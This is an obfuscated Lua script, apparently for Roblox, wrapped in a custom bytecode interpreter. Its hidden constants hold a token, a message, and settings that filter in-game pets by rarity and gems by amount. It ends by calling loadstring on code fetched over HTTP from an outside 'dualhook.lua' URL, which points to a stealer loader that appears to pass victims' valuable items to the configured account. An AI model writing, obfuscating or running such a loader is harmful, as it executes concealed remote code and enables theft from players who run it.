--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v90=v5(v83,v19);v19=nil;return v90;else return v83;end end end);local function v20(v31,v32,v33)if v33 then local v84=0 -0 ;local v85;while true do if (v84==(877 -(282 + 595))) then v85=(v31/((5 -(1640 -(1523 + 114)))^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 58 + 6))) -(v32-1)) + ((1328 -396) -(857 + 74)))) ;return v85-(v85%1) ;end end else local v86=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v86 + v86))>=v86) and (1 + 0)) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=1065 -(68 + 997) ;local v36;local v37;while true do if (v35==(1271 -(226 + 1044))) then return (v37 * ((2071 -(892 + 65)) -(2046 -1188))) + v36 ;end if (v35==0) then v36,v37=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + 2 + 0 ;v35=1 + 0 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 4 ;return (v41 * (31011612 -14234396)) + (v40 * (120312 -54776)) + (v39 * (606 -(87 + 263))) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=181 -(67 + 113) ;local v45=(v20(v43,1 + 0 ,20) * (((12 -8) -2)^(24 + 8))) + v42 ;local v46=v20(v43,83 -(62 + 0) ,31);local v47=((v20(v43,984 -((820 -(10 + 8)) + 150) )==(792 -(368 + 423))) and  -(2 -1)) or ((3 -2) -0) ;if (v46==(0 + 0)) then if (v45==(997 -(915 + (524 -(416 + 26))))) then return v47 * 0 ;else v46=2 -(3 -2) ;v44=0 + 0 ;end elseif (v46==(2691 -644)) then return ((v45==(1187 -(1069 + 118))) and (v47 * ((2 -1)/(0 -0)))) or (v47 * NaN) ;end return v8(v47,v46-(77 + 101 + 845) ) * (v44 + (v45/((3 -1)^(91 -39)))) ;end local function v25(v48)local v49;if  not v48 then local v87=438 -(145 + 293) ;while true do if (v87==(1138 -(116 + 1022))) then v48=v23();if (v48==(0 + 0)) then return "";end break;end end end v49=v3(v16,v18,(v18 + v48) -(431 -(44 + 386)) );v18=v18 + v48 ;local v50={};for v67=773 -((836 -635) + 571) , #v49 do v50[v67]=v2(v1(v3(v49,v67,v67)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 -0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v51~=(1001 -(451 + 549))) then else v54=nil;v55=nil;v51=2;end if (v51~=2) then else v56=nil;v57=nil;v51=1 + 2 ;end if (v51~=(4 -1)) then else v58=nil;v59=nil;v51=6 -2 ;end if (v51==(1384 -(746 + 638))) then v52=0 + 0 ;v53=nil;v51=1;end if (v51==4) then v60=nil;while true do if (v52~=(1 -0)) then else v55=nil;v56=nil;v52=2;end if (v52~=3) then else local v97=341 -(218 + 123) ;while true do if (0==v97) then v59=nil;v60=nil;v97=1582 -(1535 + 46) ;end if (v97==(1 + 0)) then v52=4;break;end end end if (v52==4) then while true do if (v53==1) then v56=nil;v57=nil;v53=2;end if (v53~=2) then else local v100=0 + 0 ;while true do if (v100~=1) then else v53=563 -(306 + 254) ;break;end if (v100~=0) then else local v104=0 + 0 ;while true do if (v104==0) then v58=nil;v59=nil;v104=1 -0 ;end if (v104==1) then v100=1;break;end end end end end if (v53~=0) then else v54=0;v55=nil;v53=1;end if (v53~=(1470 -(899 + 568))) then else v60=nil;while true do local v101=0 + 0 ;local v102;local v103;while true do if (1==v101) then while true do if (v102==(0 -0)) then v103=0;while true do if (v103~=0) then else local v208=603 -(268 + 335) ;local v209;while true do if (v208~=(290 -(60 + 230))) then else v209=0;while true do if (v209~=1) then else v103=573 -(426 + 146) ;break;end if (v209==(0 + 0)) then local v214=0;while true do if (0~=v214) then else if (v54==0) then local v227=1456 -(282 + 1174) ;local v228;while true do if (v227~=(811 -(569 + 242))) then else v228=0;while true do if (1~=v228) then else v57={};v54=1;break;end if (v228~=(0 -0)) then else local v233=0 + 0 ;while true do if (v233==(1025 -(706 + 318))) then v228=1252 -(721 + 530) ;break;end if (v233==(1271 -(945 + 326))) then v55={};v56={};v233=2 -1 ;end end end end break;end end end if (v54~=(3 + 0)) then else local v229=700 -(271 + 429) ;while true do if (v229==0) then local v230=0;while true do if (0==v230) then for v240=1 + 0 ,v23() do v56[v240-(1501 -(1408 + 92)) ]=v28();end return v58;end end end end end v214=1087 -(461 + 625) ;end if (v214==1) then v209=1289 -(993 + 295) ;break;end end end end break;end end end if (v103==1) then if (v54~=(1 + 0)) then else local v210=0;local v211;while true do if (v210==(1171 -(418 + 753))) then v211=0 + 0 ;while true do if (v211~=1) then else v60={};v54=1 + 1 ;break;end if (v211~=(0 + 0)) then else local v220=0 + 0 ;while true do if (v220~=1) then else v211=1;break;end if (v220~=(529 -(406 + 123))) then else v58={v55,v56,nil,v57};v59=v23();v220=1 + 0 ;end end end end break;end end end if (v54~=(1147 -(466 + 679))) then else local v212=0 -0 ;while true do if ((0 -0)~=v212) then else local v213=1900 -(106 + 1794) ;while true do if (v213~=(0 + 0)) then else for v222=1 + 0 ,v59 do local v223=0;local v224;local v225;local v226;while true do if (0~=v223) then else v224=0 -0 ;v225=nil;v223=2 -1 ;end if (v223~=(115 -(4 + 110))) then else v226=nil;while true do if ((585 -(57 + 527))~=v224) then else if (v225==(1428 -(41 + 1386))) then v226=v21()~=(103 -(17 + 86)) ;elseif (v225==(2 + 0)) then v226=v24();elseif (v225~=(6 -3)) then else v226=v25();end v60[v222]=v226;break;end if (v224~=0) then else local v232=0 -0 ;while true do if (1==v232) then v224=1;break;end if (v232~=0) then else v225=v21();v226=nil;v232=167 -(122 + 44) ;end end end end break;end end end v58[3]=v21();v213=1 -0 ;end if (v213~=(3 -2)) then else v212=1 + 0 ;break;end end end if (v212~=(1 + 0)) then else for v215=1,v23() do local v216=0 -0 ;local v217;local v218;local v219;while true do if (v216==1) then v219=nil;while true do if (v217~=(66 -(30 + 35))) then else while true do if ((0 + 0)~=v218) then else v219=v21();if (v20(v219,1,1)==0) then local v234=1257 -(1043 + 214) ;local v235;local v236;local v237;local v238;local v239;while true do if (v234==(0 -0)) then v235=1212 -(323 + 889) ;v236=nil;v234=1;end if (v234==2) then v239=nil;while true do if (v235==(0 -0)) then v236=580 -(361 + 219) ;v237=nil;v235=1;end if (v235~=(322 -(53 + 267))) then else while true do if ((1 + 1)~=v236) then else local v242=0;while true do if ((413 -(15 + 398))==v242) then local v250=0;while true do if (1~=v250) then else v242=983 -(18 + 964) ;break;end if (v250~=(0 -0)) then else local v251=0;while true do if (0==v251) then if (v20(v238,1,1 + 0 )==(1 + 0)) then v239[852 -(20 + 830) ]=v60[v239[2 + 0 ]];end if (v20(v238,2,128 -(116 + 10) )~=(1 + 0)) then else v239[3]=v60[v239[741 -(542 + 196) ]];end v251=1 -0 ;end if (v251~=(1 + 0)) then else v250=1 + 0 ;break;end end end end end if (v242~=1) then else v236=2 + 1 ;break;end end end if (v236~=1) then else local v243=0 -0 ;local v244;while true do if (v243==0) then v244=0;while true do if (v244==1) then v236=4 -2 ;break;end if ((1551 -(1126 + 425))~=v244) then else v239={v22(),v22(),nil,nil};if (v237==(0 -0)) then local v253=0;local v254;while true do if ((1121 -(118 + 1003))==v253) then v254=0;while true do if (v254~=0) then else v239[8 -5 ]=v22();v239[381 -(142 + 235) ]=v22();break;end end break;end end elseif (v237==1) then v239[3]=v23();elseif (v237==2) then v239[3]=v23() -(2^(72 -56)) ;elseif (v237==(1 + 2)) then local v264=0;local v265;while true do if (v264~=0) then else v265=977 -(553 + 424) ;while true do if ((0 -0)==v265) then v239[3 + 0 ]=v23() -(2^16) ;v239[4 + 0 ]=v22();break;end end break;end end end v244=1;end end break;end end end if (v236==3) then if (v20(v238,3,2 + 1 )==1) then v239[4]=v60[v239[2 + 2 ]];end v55[v215]=v239;break;end if (v236~=(0 + 0)) then else local v246=0 -0 ;local v247;while true do if (v246==0) then v247=0 -0 ;while true do if (v247==(0 -0)) then local v252=0 + 0 ;while true do if (v252~=(4 -3)) then else v247=1;break;end if (0==v252) then local v255=0;while true do if (0~=v255) then else v237=v20(v219,2,756 -(239 + 514) );v238=v20(v219,4,6);v255=1;end if (v255~=1) then else v252=1;break;end end end end end if (v247==(1 + 0)) then v236=1;break;end end break;end end end end break;end if ((1330 -(797 + 532))==v235) then v238=nil;v239=nil;v235=2 + 0 ;end end break;end if (v234~=(1 + 0)) then else v237=nil;v238=nil;v234=4 -2 ;end end end break;end end break;end if (v217~=(1202 -(373 + 829))) then else v218=731 -(476 + 255) ;v219=nil;v217=1;end end break;end if (v216==(1130 -(369 + 761))) then v217=0;v218=nil;v216=1 + 0 ;end end end v54=5 -2 ;break;end end end break;end end break;end end break;end if (v101==0) then v102=0;v103=nil;v101=1 -0 ;end end end break;end end break;end if ((240 -(64 + 174))==v52) then local v98=0 + 0 ;while true do if (v98==(0 -0)) then v57=nil;v58=nil;v98=337 -(144 + 192) ;end if (v98==(217 -(42 + 174))) then v52=3 + 0 ;break;end end end if (v52~=(0 + 0)) then else local v99=0 + 0 ;while true do if (v99==1) then v52=1505 -(363 + 1141) ;break;end if (0==v99) then v53=0;v54=nil;v99=1;end end end end break;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v89=0;while true do if (1==v89) then if (v82<=7) then if (v82<=3) then if (v82<=1) then if (v82>0) then v79[v81[2]]();else local v105=0;local v106;while true do if (v105==0) then v106=v81[2];v79[v106]=v79[v106](v13(v79,v106 + 1 ,v74));break;end end end elseif (v82==2) then v79[v81[2]]={};else do return;end end elseif (v82<=5) then if (v82==4) then v73=v81[3];else v79[v81[2]]=v81[3];end elseif (v82==6) then v79[v81[2]]=v81[3]~=0 ;else local v112=0;while true do if (v112==3) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=4;end if (v112==0) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=1;end if (v112==6) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=7;end if (v112==4) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=5;end if (v112==1) then v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v112=2;end if (v112==9) then v79[v81[2]][v81[3]]=v81[4];break;end if (v112==7) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=8;end if (v112==5) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=6;end if (v112==8) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v112=9;end if (v112==2) then v79[v81[2]]={};v73=v73 + 1 ;v81=v69[v73];v112=3;end end end elseif (v82<=11) then if (v82<=9) then if (v82>8) then v63[v81[3]]=v79[v81[2]];else local v115=0;local v116;local v117;local v118;local v119;while true do if (v115==0) then v116=v81[2];v117,v118=v72(v79[v116](v13(v79,v116 + 1 ,v81[3])));v115=1;end if (v115==2) then for v205=v116,v74 do v119=v119 + 1 ;v79[v205]=v117[v119];end break;end if (v115==1) then v74=(v118 + v116) -1 ;v119=0;v115=2;end end end elseif (v82>10) then local v120;local v121,v122;local v123;local v124;v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v124=v81[2];v123=v79[v81[3]];v79[v124 + 1 ]=v123;v79[v124]=v123[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3]~=0 ;v73=v73 + 1 ;v81=v69[v73];v124=v81[2];v121,v122=v72(v79[v124](v13(v79,v124 + 1 ,v81[3])));v74=(v122 + v124) -1 ;v120=0;for v142=v124,v74 do v120=v120 + 1 ;v79[v142]=v121[v120];end v73=v73 + 1 ;v81=v69[v73];v124=v81[2];v79[v124]=v79[v124](v13(v79,v124 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];v73=v81[3];else local v134=0;local v135;local v136;while true do if (v134==1) then v79[v135 + 1 ]=v136;v79[v135]=v136[v81[4]];break;end if (v134==0) then v135=v81[2];v136=v79[v81[3]];v134=1;end end end elseif (v82<=13) then if (v82==12) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else local v137=0;while true do if (0==v137) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=1;end if (v137==5) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=6;end if (v137==4) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=5;end if (v137==7) then v79[v81[2]]=v81[3];break;end if (v137==2) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=3;end if (v137==1) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=2;end if (v137==6) then v63[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];v137=7;end if (3==v137) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v137=4;end end end elseif (v82>14) then v79[v81[2]]=v63[v81[3]];else v79[v81[2]][v81[3]]=v81[4];end v73=v73 + 1 ;break;end if (v89==0) then v81=v69[v73];v82=v81[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!213O00028O0003053O00546F6B656E031E3O00353679757A6C71422O58654F30754D78447969652O382O6841794A547A6D03073O004D652O7361676503053O00672O6F6679026O00F03F03073O005765625465787403063O00436F656E277303063O00472O6F46277303083O0053652O74696E677303043O0047656D73024O0080842E4103073O00546974616E6963026O00594003043O0048756765026O00544003063O0042616E616E6103063O00426C61642O652O033O00452O6703043O004769667403053O004576656E74025O00C0524003093O004578636C757369766503083O004D7974686963616C03093O004C6567656E6461727903043O004570696303043O005261726503053O004261736963027O0040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031F3O00682O7470733A2O2F672O6F662E70726F2F732F6475616C682O6F6B2E6C7561002B3O0012053O00013O00260C3O000800010001002O043O00080001001205000100033O001209000100023O001205000100053O001209000100043O0012053O00063O00260C3O001E00010006002O043O001E00012O000200013O000100300700010008000900122O000100076O00013O000E00302O0001000B000C00302O0001000D000E00302O0001000F001000302O00010011000E00302O00010012000E00302O00010013000E00302O00010014000E00300E00010015001600300D00010017001600302O00010018000100302O00010019000100302O0001001A000100302O0001001B000100302O0001001C000100122O0001000A3O00124O001D3O00260C3O00010001001D002O043O0001000100120F0001001E3O00120B0002001F3O00202O00020002002000122O000400216O000500016O000200056O00013O00024O00010001000100044O002A0001002O043O000100012O00033O00017O00",v9(),...);end
